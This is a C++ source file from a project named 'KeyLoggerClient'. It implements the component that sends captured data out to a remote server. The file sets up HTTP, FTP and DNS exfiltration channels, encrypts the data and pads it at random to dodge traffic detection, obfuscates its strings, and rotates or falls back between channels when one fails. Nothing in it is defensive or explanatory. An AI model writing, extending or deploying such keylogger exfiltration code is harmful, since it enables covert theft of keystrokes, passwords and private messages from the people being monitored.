// KeyLoggerClient/src/communication/CommsManager.cpp
#include "communication/CommsManager.h"
#include "communication/HttpComms.h"
#include "communication/FtpComms.h"
#include "communication/DnsComms.h"
#include "core/Logger.h"
#include "core/Configuration.h"
#include "security/Obfuscation.h"
#include "security/Encryption.h"
#include "utils/NetworkUtils.h"
#include "utils/DataUtils.h"
#include <memory>
#include <algorithm>

// Obfuscated strings
constexpr auto OBF_COMMS_MANAGER = OBFUSCATE("CommsManager");

CommsManager::CommsManager(Configuration* config)
    : m_config(config), m_currentMethod(nullptr) {
    InitializeCommsMethods();
}

CommsManager::~CommsManager() {
    Shutdown();
}

void CommsManager::InitializeCommsMethods() {
    // Register available communication methods
    m_commsMethods[OBFUSCATE("http")] = std::make_unique<HttpComms>(m_config);
    m_commsMethods[OBFUSCATE("https")] = std::make_unique<HttpComms>(m_config);
    m_commsMethods[OBFUSCATE("ftp")] = std::make_unique<FtpComms>(m_config);
    m_commsMethods[OBFUSCATE("dns")] = std::make_unique<DnsComms>(m_config);
    
    LOG_DEBUG("Initialized " + std::to_string(m_commsMethods.size()) + 
              " communication methods");
}

bool CommsManager::Initialize() {
    std::string method = m_config->GetCommsMethod();
    
    // Determine which server URL to use based on network mode
    std::string networkMode = m_config->GetNetworkMode();
    std::string effectiveUrl;
    
    if (networkMode == "same_wifi") {
        effectiveUrl = m_config->GetSameWifiServerUrl();
    } else if (networkMode == "different_wifi") {
        effectiveUrl = m_config->GetDifferentWifiServerUrl();
    } else { // auto detection
        if (NetworkUtils::IsOnLocalNetwork()) {
            effectiveUrl = m_config->GetSameWifiServerUrl();
        } else {
            effectiveUrl = m_config->GetDifferentWifiServerUrl();
        }
    }
    
    // Temporarily override the server URL for this connection
    m_config->SetValue("server_url", effectiveUrl);
    
    auto it = m_commsMethods.find(method);
    
    if (it == m_commsMethods.end()) {
        LOG_ERROR("Unknown communication method: " + method);
        return false;
    }

    m_currentMethod = it->second.get();
    
    if (m_currentMethod->Initialize()) {
        LOG_INFO("Communication method initialized: " + method);
        return true;
    }

    LOG_ERROR("Failed to initialize communication method: " + method);
    return TryFallbackMethods(method);
}

bool CommsManager::TryFallbackMethods(const std::string& failedMethod) {
    LOG_INFO("Attempting fallback communication methods");
    
    for (const auto& [method, comms] : m_commsMethods) {
        if (method != failedMethod) {
            LOG_INFO("Trying fallback method: " + method);
            if (comms->Initialize()) {
                m_currentMethod = comms.get();
                LOG_INFO("Fallback communication initialized with method: " + method);
                return true;
            }
        }
    }
    
    LOG_ERROR("All communication methods failed to initialize");
    return false;
}

bool CommsManager::TransmitData(const std::vector<uint8_t>& data) {
    if (!m_currentMethod) {
        LOG_ERROR("No communication method selected for transmission");
        return false;
    }

    // Encrypt data before transmission
    std::string encryptionKey = m_config->GetEncryptionKey();
    std::vector<uint8_t> encryptedData = security::Encryption::EncryptData(data, encryptionKey);

    // Add random padding to avoid fixed size patterns
    utils::DataUtils::AddRandomPadding(encryptedData, 16, 256);

    bool success = m_currentMethod->SendData(encryptedData);
    
    if (!success) {
        LOG_WARN("Primary transmission failed, attempting rotation");
        RotateCommsMethod();
        success = m_currentMethod->SendData(encryptedData);
    }

    return success;
}

void CommsManager::RotateCommsMethod() {
    LOG_INFO("Rotating communication method");
    
    // Find next method in rotation
    auto it = m_commsMethods.find(m_config->GetCommsMethod());
    if (it == m_commsMethods.end()) {
        it = m_commsMethods.begin();
    } else {
        ++it;
        if (it == m_commsMethods.end()) {
            it = m_commsMethods.begin();
        }
    }

    m_config->SetValue("comms_method", it->first);
    m_currentMethod = it->second.get();
    
    LOG_INFO("Communication method rotated to: " + it->first);
}

void CommsManager::Shutdown() {
    if (m_currentMethod) {
        m_currentMethod->Cleanup();
    }
    LOG_INFO("Communication manager shut down");
}

bool CommsManager::TestConnection() const {
    if (!m_currentMethod) return false;
    return m_currentMethod->TestConnection();
}